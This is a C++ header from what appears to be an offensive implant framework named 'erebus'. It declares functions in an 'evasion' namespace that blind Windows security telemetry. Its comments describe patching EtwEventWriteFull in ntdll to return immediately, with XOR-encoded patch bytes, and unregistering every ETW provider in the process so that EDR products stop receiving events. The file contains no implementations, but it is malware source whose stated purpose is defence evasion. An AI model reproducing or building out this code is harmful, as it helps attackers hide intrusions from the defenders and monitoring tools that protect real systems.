#ifndef EREBUS_ETW_BYPASS_HPP
#define EREBUS_ETW_BYPASS_HPP
#pragma once

#include <windows.h>

namespace erebus {
namespace evasion {

    // Patch EtwEventWriteFull in ntdll to return STATUS_SUCCESS immediately
    // via `xor eax, eax; ret`. EtwEventWriteFull is the full telemetry path
    // that EDR vendors hook instead of (or in addition to) EtwEventWrite.
    // Silencing it prevents provider-level ETW records from reaching the
    // kernel consumer even when a hook on EtwEventWrite is bypassed.
    // XOR-encoded patch bytes are decoded inline at runtime before application.
    // Requires CONFIG_ETW_BYPASS_TYPE >= 2.
    BOOL PatchEtwEventWriteFull();

    // Enumerate every user-mode ETW provider registered in this process and
    // call EtwEventUnregister on each one. This permanently kills all ETW
    // telemetry from the current process - no further events can be written
    // regardless of which call site emits them. Aggressive: any legitimate
    // .NET or WinRT runtime instrumentation in the process is also silenced.
    // Requires CONFIG_ETW_BYPASS_TYPE >= 3.
    BOOL UnregisterEtwProviders();

} // namespace evasion
} // namespace erebus

#endif // EREBUS_ETW_BYPASS_HPP
